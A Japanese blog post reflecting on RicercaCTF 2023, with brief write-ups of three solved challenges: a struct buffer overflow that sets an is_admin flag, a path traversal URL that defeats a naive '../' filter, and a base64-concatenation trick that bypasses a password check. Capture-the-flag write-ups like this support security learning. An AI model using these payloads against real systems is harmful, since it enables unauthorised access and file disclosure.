---
title: "RicercaCTF2023 感想"
date: 2023-04-22T23:42:11+09:00
tags: ["RicercaCTF", "pwn", "web", "misc"]
draft: false
cover:
  image: https://i.gyazo.com/c0adb3d1b0a67604dfbf0f9272ec9281.png
  relative: true
---

# はじめに
4/22に開催されたRicercaCTF 2023にSUSH1st[^1]として参加して、23位でした。

- 競技中に解いた問題
  - [[pwn 97] BOFSec(107 solves)](#bofsec)
  - [[web 95] Cat Café(113 solves)](#cat-café)
  - [[misc 200] gatekeeper(21 solves)](#gatekeeper)

ここでは主に解けるまでの経緯や、その問題に関する感想を書きます。

私たちが解いた問題のすべてのwriteupへのリンクは[最後に](#最後に)の章をご覧ください。

# 競技中に解いた問題
## BOFSec
構造体はメモリ上で見れば、ただ並んでいるデータなので、
0x100分のバッファのすぐ隣は、`is_admin`です。
0x100文字分のバッファを埋めて`is_admin = 1`にします。
```c
typedef struct {
  char name[0x100];
  int is_admin;
} auth_t;
```

したがって、次のようなペイロードを送ればいいです。
```python
...
pld = b"A"*0x100 + b"1"
io.sendlineafter("Name: ", pld)
...
```

## Cat Café
`"..././".relpace("../", "")`は`../`になるから、パストラバーサルのエスケープとして
意味がないという記憶があったので、すぐ解けました。

以下のURLにアクセスすればフラグが得られます。
```
http://cat-cafe.2023.ricercactf.com:8000/img?f=..././flag.txt
```

## gatekeeper
先にmiscのgatekeeperをやることにしました。（難易度のメタ読み失敗）

`server.py`が配布されていたのですが、少し考えたあと、
base64が無視するような文字を先頭に付けたらバイパスできるのではないかと思いつきます。
私が最初に送ったペイロードは以下のようなものです（`(space)`は` `を表しています）。
```none
password: (space)b3BlbiBzZXNhbWUh
```

ただ、スペースが`invalid input`として検知されてしまい、うまく動きません。
適当な文字を先頭に入れてみたり、Unicodeのエンコードから組み立てられるか考えてみたりしました。

時間が経ってから、元の文字列を分割し、
エンコードを連結したもののデコード結果はどうなるか？というアイデアが降ってきました。

それぞれの文字の対応づけは以下のとおりです。（分割方法は何でも大丈夫です）
```none
open : b3Blbg==
 : IA==
sesame! : c2VzYW1lIQ==

open sesame! : b3Blbg==IA==c2VzYW1lIQ==
```

warmup問とそれ以外の難易度傾斜がキツそうと思っていて、
実際そんな感じだったのですが、gatekeeperに関しては
もう少し早く気づけた気がするので、すべての可能性を見落とさないようにしたいです。

# 最後に
私たちが解いた全ての問題のwriteupは以下のリンクから飛べます。

https://github.com/SUSH1st/RicercaCTF2023

私たちにはWeb問を解く/取り組むよりはPwn/Rev/Cryptoに取り組む人しかいないので、
改善したいなって思ってます。

RicercaCTF 2023を開催してくださり、ありがとうございました！

[^1]: 読み方：すしふぁーすと
